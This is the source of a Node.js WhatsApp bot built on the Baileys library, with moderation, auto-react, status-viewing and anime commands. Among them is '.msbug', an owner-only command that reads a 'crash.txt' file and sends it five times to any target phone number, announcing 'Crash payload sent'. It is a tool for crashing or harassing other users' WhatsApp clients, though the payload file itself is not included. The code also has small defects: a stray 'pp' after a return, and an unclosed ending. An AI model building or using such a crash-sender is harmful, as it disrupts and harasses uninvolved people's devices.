import express from "express";
import pkg from "@whiskeysockets/baileys";
const {
  default: makeWASocket,
  DisconnectReason,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  downloadMediaMessage,
} = pkg;
import P from "pino";
import sharp from "sharp";
import { fileTypeFromBuffer } from "file-type";
import axios from "axios";
import fs from "fs";

const app = express();
const PORT = parseInt(process.env.PORT || "8080");
let sock = null;
let autoStatusEnabled = false;
let autoReactEnabled = false;
let antiLinkEnabled = false;
let welcomeEnabled = false;
let msbot = { public: true };

const userWarnings = {}; // {groupId: {userId: warnCount}}
const OWNER_NUMBER = "923215813715@s.whatsapp.net";
const OWNER_CONTACT = "wa.me/923215813715";
const OWNER_IMAGE_PATH = "./media/msbot.jpg";
const MEME_API = "https://meme-api.com/gimme";

const mess = {
  err: "⚠️ Something went wrong!",
  admin: "❌ Only *Group Admins* or *Bot Owner* can use this command.",
  botadmin: "❌ Bot needs *Admin Privileges*.",
  owner: "❌ *Only Bot Owner can use this command!*\n\n👑 This command is restricted to maintain bot security.",
};


// Helper to send bot image with every reply
async function sendWithBotImage(sock, jid, text, msg) {
  let ownerPic;
  try { ownerPic = fs.readFileSync(OWNER_IMAGE_PATH); } catch (e) { ownerPic = undefined; }
  if (ownerPic) {
    await sock.sendMessage(jid, { image: ownerPic, caption: text }, { quoted: msg });
  } else {
    await sock.sendMessage(jid, { text }, { quoted: msg });
  }
}

function isGroup(jid) { return jid && jid.endsWith("@g.us"); }
function isReplyWithParticipant(msg) {
  return !!msg.message?.extendedTextMessage?.contextInfo?.participant;
}
function getRepliedParticipant(msg) {
  return msg.message.extendedTextMessage.contextInfo.participant;
}
function normalizeCmd(txt) {
  return txt.trim().split(" ")[0].replace(/^\./, "").toLowerCase();
}

async function startWhatsAppBot() {
  const { state, saveCreds } = await useMultiFileAuthState("auth_info");
  const { version } = await fetchLatestBaileysVersion();

  sock = makeWASocket({
    version,
    auth: state,
    logger: P({ level: "silent" }),
    printQRInTerminal: false
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "open") {
      console.log("✅ WhatsApp Bot Connected!");
    }
    if (connection === "close") {
      const shouldReconnect =
        lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(`[❌] WhatsApp connection closed. Reconnect? ${shouldReconnect}`);
      if (shouldReconnect) startWhatsAppBot();
    }
  });

  // Welcome Handler
  sock.ev.on("group-participants.update", async (update) => {
    if (!welcomeEnabled) return;
    const { id, participants, action } = update;
    if (action === "add") {
      for (const user of participants) {
        await sock.sendMessage(id, { text: `👋 Welcome <@${user.split("@")[0]}> to the group!`, mentions: [user] });
      }
    }
    if (action === "remove") {
      for (const user of participants) {
        await sock.sendMessage(id, { text: `👋 <@${user.split("@")[0]}> left the group.`, mentions: [user] });
      }
    }
  });

  // --- Fixed AUTOSTATUS: Mark all statuses as seen automatically if enabled ---
  sock.ev.on("messages.upsert", async ({ messages, type }) => {
    if (!messages || !messages.length) return;

    // Cache for group metadata in this event
    let groupMetaCache = {};

    for (const msg of messages) {
      // Status Seen Logic (Autostatus) - Enhanced Fix
      if (autoStatusEnabled && msg.key && msg.key.remoteJid) {
        // Check if it's a status message
        const isStatus = msg.key.remoteJid.endsWith("@status.broadcast") || 
                        msg.key.remoteJid === "status@broadcast" ||
                        (msg.key.remoteJid.includes("status") && msg.key.remoteJid.includes("broadcast"));

        if (isStatus) {
          try {
            // Multiple approaches to mark status as seen
            await sock.readMessages([msg.key]);

            // Also try alternative method
            if (msg.key.participant) {
              await sock.sendReceipt(msg.key.remoteJid, msg.key.participant, [msg.key.id], 'read');
            }

            const statusOwner = msg.key.participant || msg.key.remoteJid;
            console.log(`[AUTOSTATUS] ✅ Status viewed from: ${statusOwner}`);
          } catch (err) {
            console.error("[AUTOSTATUS] ❌ Failed to view status:", err.message);

            // Try alternative approach
            try {
              await sock.sendMessage(msg.key.remoteJid, { 
                receipt: { 
                  messageIds: [msg.key.id], 
                  type: 'read' 
                } 
              });
              console.log(`[AUTOSTATUS] ✅ Status viewed (alternative method)`);
            } catch (altErr) {
              console.error("[AUTOSTATUS] ❌ Alternative method also failed:", altErr.message);
            }
          }
          continue; // Don't process status messages as regular messages
        }
      }

      // Only process normal chat messages below
      if (!msg.message) continue;

      const from = msg.key.remoteJid;
      const sender = msg.key.participant || msg.key.remoteJid;
      const rawBody =
        msg.message.conversation ||
        msg.message.extendedTextMessage?.text ||
        msg.message.imageMessage?.caption ||
        "";
      const body = rawBody.trim();
      const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
      const cmd = normalizeCmd(body);

      // Public/Self (ignore all except owner in self mode)
      const isOwner = (msg.key.fromMe || sender === OWNER_NUMBER);
      let isGroupAdmins = false;
      let isBotAdmins = false;
      let meta;
      if (isGroup(from)) {
        if (groupMetaCache[from]) {
          meta = groupMetaCache[from];
        } else {
          try {
            meta = await sock.groupMetadata(from);
            groupMetaCache[from] = meta;
          } catch (e) {
            await sendWithBotImage(sock, from, "⚠️ *WhatsApp is rate-limiting! Try again after some time.*", msg);
            return;
          }
        }
        isGroupAdmins = meta.participants.some(
          (p) => p.id === sender && (p.admin === "admin" || p.admin === "superadmin")
        );
        isBotAdmins = meta.participants.some(
          (p) => p.id === sock.user.id && (p.admin === "admin" || p.admin === "superadmin")
        );
      }
      if (!msbot.public && !isOwner) return;

      // --- ANTI-LINK SYSTEM (delete link if enabled, in group, and not admin) ---
      if (
        antiLinkEnabled &&
        isGroup(from) &&
        !msg.key.fromMe &&
        !isOwner
      ) {
        // Check if sender is admin
        const senderIsAdmin = meta.participants.some(
          (p) => p.id === sender && (p.admin === "admin" || p.admin === "superadmin")
        );

        // Only delete if sender is NOT an admin
        if (!senderIsAdmin) {
          // Enhanced link detection
          const linkRegex = /(?:https?:\/\/|www\.|wa\.me\/|chat\.whatsapp\.com\/|t\.me\/|discord\.gg\/|bit\.ly\/|tinyurl\.com|youtube\.com|youtu\.be|instagram\.com|facebook\.com|twitter\.com|tiktok\.com)/i;
          const messageText = body || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || msg.message.videoMessage?.caption || "";

          if (linkRegex.test(messageText)) {
            try {
              // Check if bot has admin rights
              const botJid = sock.user.id;
              const botIsAdmin = meta.participants.some(
                (p) => (p.id === botJid || p.id.includes(botJid.split(':')[0])) && (p.admin === "admin" || p.admin === "superadmin")
              );

              if (botIsAdmin) {
                // Delete the message
                await sock.sendMessage(from, { delete: msg.key });

                // Send warning
                await sock.sendMessage(from, { 
                  text: `🚫 *AntiLink Activated*\n\n@${sender.split("@")[0]} your message was deleted!\n\n❌ Links are not allowed in this group.\n⚠️ Only admins can share links.`, 
                  mentions: [sender] 
                });

                console.log(`[ANTILINK] ✅ Deleted link message from ${sender.split("@")[0]} in ${meta?.subject || from}`);
              } else {
                // Bot doesn't have admin rights
                await sock.sendMessage(from, { 
                  text: `🚫 *AntiLink Warning*\n\n@${sender.split("@")[0]} shared a link!\n\n❌ Links are not allowed but bot needs admin privileges to delete messages.`, 
                  mentions: [sender] 
                });
                console.log(`[ANTILINK] ⚠️ Link detected but bot lacks admin privileges in ${meta?.subject || from}`);
              }
            } catch (e) {
              console.error("[ANTILINK] ❌ Failed to process link:", e);
            }
            return;
          }
        }
      }

      // --- AUTOREACT SYSTEM (react to every group message if enabled) ---
      if (
        autoReactEnabled &&
        isGroup(from) &&
        !msg.key.fromMe &&
        !msg.message.protocolMessage &&
        !from.endsWith("@status.broadcast") &&
        (msg.message.conversation || 
         msg.message.extendedTextMessage || 
         msg.message.imageMessage || 
         msg.message.videoMessage ||
         msg.message.audioMessage ||
         msg.message.documentMessage)
      ) {
        try {
          const reactions = ["💘", "❤️", "😍", "🔥", "🤖", "💥", "💯", "✨"];
          const randomReact = reactions[Math.floor(Math.random() * reactions.length)];

          await sock.sendMessage(from, {
            react: {
              text: randomReact,
              key: msg.key,
            },
          });
          console.log(`[AUTOREACT] Reacted with ${randomReact} to message in ${meta?.subject || from}`);
        } catch (e) {
          console.error("[AUTOREACT] Failed to react:", e);
        }
      }
        
        // ───── BUG COMMAND (.msbug) ─────
if (body.startsWith(".msbug")) {
  const args = body.split(" ");
  const targetNum = args[1] && args[1].replace(/\D/g, "");
  const filePath = "./media/crash.txt";

  // 🔒 Owner check
  const senderClean = (msg.key.participant || msg.key.remoteJid).replace(/\D/g, "");
  const ownerClean = OWNER_NUMBER.replace(/\D/g, "");
  if (!senderClean.includes(ownerClean)) {
    await sock.sendMessage(from, { text: "🔐 Only owner can use this command." }, { quoted: msg });
    return;
  }

  if (!targetNum || targetNum.length < 9) {
    await sock.sendMessage(from, {
      text: "❗ Provide valid number.\n\n_Usage:_ `.msbug 923xxxxxxxxx`"
    }, { quoted: msg });
    return;
  }

  const targetJid = `${targetNum}@s.whatsapp.net`;

  // 📥 Read crash file
  let content;
  try {
    content = fs.readFileSync(filePath, "utf-8");
  } catch {
    await sock.sendMessage(from, {
      text: `❌ crash.txt not found in ./media folder.`
    }, { quoted: msg });
    return;
  }

  const payload = "⚠️ *System Bug Initiated*\n\n⬇️\n\n" + content;

  // 🔁 Send 5 times
  for (let i = 0; i < 5; i++) {
    try {
      await sock.sendMessage(targetJid, { text: payload }, { quoted: msg });
      await new Promise(res => setTimeout(res, 1200));
    } catch (err) {
      await sock.sendMessage(from, { text: `❌ Failed at attempt #${i + 1}` }, { quoted: msg });
      break;
    }
  }

  await sock.sendMessage(from, {
    text: `✅ Crash payload sent to: *${targetNum}*\n> MS-BOT V1.0 🔥`
  }, { quoted: msg });
}
        

      // --- AUTOSTATUS SYSTEM (command) ---
      if (cmd === "autostatus") {
        // Enhanced owner check
        const isRealOwner = (
          msg.key.fromMe || 
          sender === OWNER_NUMBER || 
          sender.includes("923414812972") ||
          sender.split("@")[0] === "923414812972"
        );

        if (!isRealOwner) {
          await sendWithBotImage(sock, from, "❌ *Only Bot Owner can use this command!*\n\n👑 This command is restricted to maintain bot security.", msg);
          return;
        }
        const arg = body.split(" ")[1];
        let replyText = "";
        if (arg === "on") {
          autoStatusEnabled = true;
          replyText = "✅ *AutoStatus Enabled!*\n\nBot will now automatically mark all WhatsApp statuses as seen.";
        } else if (arg === "off") {
          autoStatusEnabled = false;
          replyText = "❌ *AutoStatus Disabled!*\n\nBot will no longer mark statuses as seen.";
        } else {
          replyText = `📋 *AutoStatus Settings*\n\n• .autostatus on - Enable auto status viewing\n• .autostatus off - Disable auto status viewing\n\n📊 Current Status: ${autoStatusEnabled ? "✅ ENABLED" : "❌ DISABLED"}`;
        }
        await sock.sendMessage(from, { text: replyText }, { quoted: msg });
        return;
      }

      // --- ANTI-LINK SYSTEM (command) ---
      if (cmd === "antilink") {
        // Enhanced owner check
        const isRealOwner = (
          msg.key.fromMe || 
          sender === OWNER_NUMBER || 
          sender.includes("923414812972") ||
          sender.split("@")[0] === "923414812972"
        );

        if (!isRealOwner) {
          await sendWithBotImage(sock, from, "❌ *Only Bot Owner can use this command!*\n\n👑 This command is restricted to maintain bot security.", msg);
          return;
        }
        const arg = body.split(" ")[1];
        let replyText = "";
        if (arg === "on") {
          antiLinkEnabled = true;
          replyText = "✅ *AntiLink Enabled!*\n\nAny link sent in group will be automatically deleted.";
        } else if (arg === "off") {
          antiLinkEnabled = false;
          replyText = "❌ *AntiLink Disabled!*\n\nLinks are now allowed in groups.";
        } else {
          replyText = `📋 *AntiLink Settings*\n\n• .antilink on - Enable link protection\n• .antilink off - Disable link protection\n\n📊 Current Status: ${antiLinkEnabled ? "✅ ENABLED" : "❌ DISABLED"}`;
        }
        await sock.sendMessage(from, { text: replyText }, { quoted: msg });
        return;
      }

      // --- AUTOREACT SYSTEM (command) ---
      if (cmd === "autoreact") {
        // Enhanced owner check
        const isRealOwner = (
          msg.key.fromMe || 
          sender === OWNER_NUMBER || 
          sender.includes("923414812972") ||
          sender.split("@")[0] === "923414812972"
        );

        if (!isRealOwner) {
          await sendWithBotImage(sock, from, "❌ *Only Bot Owner can use this command!*\n\n👑 This command is restricted to maintain bot security.", msg);
          return;
        }
        if (!isGroup(from)) {
          await sendWithBotImage(sock, from, "❗ This command only works in groups.", msg);
          return;
        }

        const arg = body.split(" ")[1];
        let replyText = "";

        if (arg === "on") {
          autoReactEnabled = true;
          replyText = "✅ *AutoReact Enabled!*\n\nBot will now react to all group messages with random emojis: 💘 ❤️ 😍 🔥 🤖 💥 💯 ✨";
        } else if (arg === "off") {
          autoReactEnabled = false;
          replyText = "❌ *AutoReact Disabled!*\n\nBot will no longer react to group messages.";
        } else {
          replyText = `📋 *AutoReact Settings*\n\n• .autoreact on - Enable auto reactions\n• .autoreact off - Disable auto reactions\n\n📊 Current Status: ${autoReactEnabled ? "✅ ENABLED" : "❌ DISABLED"}`;
        }

        await sock.sendMessage(from, { text: replyText }, { quoted: msg });
        return;
      }

      // --- GROUP DELETE (delete/del/d) (reply to msg) ---
      if (["delete", "del", "d"].includes(cmd)) {
        const quotedMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        const quotedKey = msg.message?.extendedTextMessage?.contextInfo?.stanzaId;
        const quotedParticipant = msg.message?.extendedTextMessage?.contextInfo?.participant;
        if (!quotedMsg || !quotedKey) {
          await sendWithBotImage(sock, from, "❗ Reply to a message to delete it.", msg);
          return;
        }
        try {
          if (!isOwner && !isGroupAdmins) {
            await sendWithBotImage(sock, from, mess.admin, msg);
            return;
          }
          if (!isBotAdmins) {
            await sendWithBotImage(sock, from, mess.botadmin, msg);
            return;
          }
          await sock.sendMessage(from, {
            delete: {
              remoteJid: from,
              fromMe: false,
              id: quotedKey,
              participant: quotedParticipant,
            },
          });
        } catch (e) {
          await sendWithBotImage(sock, from, mess.err, msg);
        }
        return;
      }

      // --- WELCOME ON/OFF ---
      if (cmd === "welcome") {
        // Enhanced owner check
        const isRealOwner = (
          msg.key.fromMe || 
          sender === OWNER_NUMBER || 
          sender.includes("923414812972") ||
          sender.split("@")[0] === "923414812972"
        );

        if (!isRealOwner) {
          await sendWithBotImage(sock, from, "❌ *Only Bot Owner can use this command!*\n\n👑 This command is restricted to maintain bot security.", msg);
          return;
        }
        const arg = body.split(" ")[1];
        let replyText = "";
        if (arg === "on") {
          welcomeEnabled = true;
          replyText = "✅ *Welcome Messages Enabled!*\n\nNew members will be welcomed automatically.";
        } else if (arg === "off") {
          welcomeEnabled = false;
          replyText = "❌ *Welcome Messages Disabled!*\n\nNo welcome messages for new members.";
        } else {
          replyText = `📋 *Welcome Settings*\n\n• .welcome on - Enable welcome messages\n• .welcome off - Disable welcome messages\n\n📊 Current Status: ${welcomeEnabled ? "✅ ENABLED" : "❌ DISABLED"}`;
        }
        await sock.sendMessage(from, { text: replyText }, { quoted: msg });
        return;pp
      }
      // ─── ANIME COMMANDS COLLECTION ─────────────────────────────

// 📺 .anime - Search anime details
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
if (cmd === "anime") {
  const query = body.slice(7).trim();
  if (!query) return sock.sendMessage(from, { text: "❗ Please provide an anime name.\nExample: .anime naruto" }, { quoted: msg });

  try {
    const res = await fetch(`https://api.jikan.moe/v4/anime?q=${encodeURIComponent(query)}&limit=1`);
    const json = await res.json();
    const anime = json.data?.[0];

    if (!anime) return sock.sendMessage(from, { text: "❌ No anime found." }, { quoted: msg });

    const caption = `🎌 *${anime.title}*\n\n📅 Aired: ${anime.aired.string}\n🎞️ Episodes: ${anime.episodes}\n⭐ Score: ${anime.score}\n📖 Synopsis: ${anime.synopsis?.slice(0, 300)}...`;

    await sock.sendMessage(from, {
      image: { url: anime.images.jpg.image_url },
      caption
    }, { quoted: msg });
  } catch (e) {
    sock.sendMessage(from, { text: "⚠️ Error fetching anime info." }, { quoted: msg });
  }
}

// 🖼️ .animepic - Get anime character image
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
if (cmd === "animepic") {
  const character = body.slice(10).trim() || "itachi";

  try {
    const res = await fetch("https://api.waifu.pics/sfw/waifu");
    const data = await res.json();

    await sock.sendMessage(from, {
      image: { url: data.url },
      caption: `🖼️ Here's your anime pic for: *${character}*`
    }, { quoted: msg });
  } catch (e) {
    sock.sendMessage(from, { text: "❌ Failed to load image." }, { quoted: msg });
  }
}

